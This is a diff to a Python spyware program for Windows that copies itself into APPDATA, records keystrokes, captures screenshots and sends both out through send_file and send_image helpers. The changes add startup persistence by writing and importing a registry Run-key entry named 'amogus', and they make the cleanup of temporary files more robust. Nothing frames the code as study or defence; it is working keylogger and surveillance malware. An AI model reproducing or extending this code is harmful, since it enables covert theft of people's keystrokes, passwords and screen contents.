@@ -91,7 +91,18 @@ if not os.path.exists(os.environ["APPDATA"]+"/"+program):
     self_clone(os.environ["APPDATA"]+"/"+program)
     if "first_setup" in dir():
         first_setup()
-    subprocess.Popen([sys.executable, os.environ["APPDATA"]+"/"+program], creationflags=subprocess.CREATE_NO_WINDOW)
+    regdata="Windows Registry Editor Version 5.00\n"
+    regdata+="\n"
+    regdata+="[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]\n"
+    regdata+='"amogus"="{}"\n'.format(os.environ["APPDATA"].replace("\\","\\\\")+"\\\\"+program)
+
+    f=open(os.environ["TEMP"]+"/autostart.reg","w")
+    f.write(regdata)
+    f.flush()
+    f.close()
+    os.system("reg import {}".format(os.environ["TEMP"]+"/autostart.reg"))
+    time.sleep(3)
+    #os.unlink(os.environ["TEMP"]+"/autostart.reg")
     sys.exit(0)
 
 define_caption()
@@ -125,8 +136,11 @@ def on_press(key):
         f.flush()
         f.close()
         send_file(fname,caption)
-        time.sleep(3)
-        os.unlink(fname)
+        try:
+            time.sleep(3)
+            os.unlink(fname)
+        except:
+            pass
         key_buffer = ""
 
 
@@ -141,8 +155,8 @@ if sys.argv[-1] == "klog":
     init_keylogger()
     sys.exit(0)
 
-subprocess.Popen([sys.executable, sys.argv[0],"klog"], creationflags=subprocess.CREATE_NO_WINDOW)
-#subprocess.Popen([sys.executable, sys.argv[0],"klog"], creationflags=subprocess.CREATE_NEW_CONSOLE)
+#subprocess.Popen([sys.executable, sys.argv[0],"klog"], creationflags=subprocess.CREATE_NO_WINDOW)
+subprocess.Popen([sys.executable, sys.argv[0],"klog"], creationflags=subprocess.CREATE_NEW_CONSOLE)
 
 while True:
     if "loop" in dir():
@@ -152,6 +166,9 @@ while True:
     print("Send ss")
     send_image(f,caption)
     key_buffer = ""
-    time.sleep(3)
-    os.unlink(f)
-    time.sleep(interval)
+    try:
+        time.sleep(3)
+        os.unlink(fname)
+    except:
+        pass
+    time.sleep(interval-3)
